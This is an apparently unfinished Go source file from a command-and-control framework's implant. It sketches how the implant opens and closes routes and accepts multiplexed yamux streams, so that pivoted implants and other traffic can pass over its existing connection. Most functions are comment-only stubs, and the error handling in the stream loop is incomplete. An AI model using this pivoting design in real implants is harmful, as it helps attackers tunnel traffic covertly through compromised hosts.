package route

import (
	"io"

	"github.com/hashicorp/yamux"
	"github.com/maxlandon/wiregost/ghost/transport"
	routepb "github.com/maxlandon/wiregost/proto/v1/gen/go/transport/route"
)

// InitRouting - Setups and starts all routing infrastructure for this implant.
// The function has access to many objects previously setup, and the behaviour
// of the function may vary depending on security, authorisations, compiled routes, etc...
func InitRouting() {

	// Check pre-compiled authorisations

	// If needed, open a dedicated muxed stream over which we send routing requests/responses.
	// Start a concurrent handler, for managing requests.

	// Check if we have various route listeners to open.

}

// OpenRoute - This implant has been requested to open a route. It adds this route to the list, and also sets up
// all the infrastructure necessary: listeners if needed, multiplexers check, etc.
func OpenRoute(req *routepb.OpenRoute) (res *routepb.OpenRoute, err error) {

	active := transport.Transports.Active

	var needsMux bool // Set by the code below, tells if we need to mux the transport for routing.

	// First recheck permissions

	// Check route protocol is supported, and check permissions if needing a listener

	// Add Route to Routes list, with all details

	// If listener, start listener

	// If multiplexed, check multiplexer is here and start a goroutine in which the transport mux server
	// waits and automatically accepts new mux requests, returning the conn to the implant's routing system.
	if needsMux {
		go HandleRouteMux(active.Multiplexer, active.ClosedMux)
	}

	// Fill a job object for future management/printing

	// Return the response with details.

	return
}

// CloseRoute - This implant has been requested to close a route. Many things have to be checked:
// - Is there any routed traffic currently going through the requested route and its associated transport ?
//   If yes and the Force option is not true, then we return the response indicating traffic is on and needs force.
func CloseRoute(req *routepb.CloseRouteRequest) (res *routepb.CloseRoute, err error) {

	// If the route was passing traffic along through a connection multiplexer, we need to
	// - 1) Notify the HandleRouteMux() goroutine to stop accepting incoming mux requests
	// - 2) Close the active.Multiplexer session.

	return
}

// HandleRouteMux - Function used as a goroutine, waiting in the background for the server and/or pivoted implants
// to request new streams in order to route pivot and/or non-implant traffic. This only applies to traffic going
// THROUGH THE SAME PHYSICAL CONNECTION as the one used by the current Active Transport.
func HandleRouteMux(mux *yamux.Session, closed <-chan struct{}) (streams chan<- io.ReadWriteCloser, errors chan<- error) {

	// The streams channel is blocking on purpose: A multiplexer session CANNOT wait for more
	// than one mux at a time: there is thus no reason to loop again while this stream has not
	// been processed by the routing system at the other end of the channel.
	streams = make(chan<- io.ReadWriteCloser)

	for {
		select {
		case <-closed:
			// This closed could be avoided if, in the default case, we check everytime that the session is
			// not nil: however, it is first not very explicit about how and when we close this routine,
			// and it is dangerous because we make assumptions about when the closed signal will arrive.
			// Thus we double check for both cases

			// Log that we closed the route multiplexing routine.
			return
		default:
			// Safety check: we might use a closed session object before having received the closed signal
			// above, so we check for nil, and if it is, we return like we add received a close notice.
			if mux == nil {
				// Log that we detected an empty multiplexing session, without warning.
				return
			}

			stream, err := mux.Accept()
			if err != nil {
				// 1) We log the error
				// 2) We return without much cleanup: there might be other connections going through
				// the session and we don't want to break more things than what already is.
			}

			// Add this new stream to the count of routed connections.
			// We might have to use precise and separate listings:
			//
			// 1) Streams used by pivoted implants to pass core C2 requests/responses
			// 2) All non-implant traffic going through, no matter what happens before/after.
			//
			// Classifying them is useful because we can then send preliminary information back the server,
			// who will know if the conn needs sessions registration, etc.

			// Add stream to the streams channel: these streams will be handled by the implant's
			// routing system and its handlers.
			streams <- stream
		}
	}
}
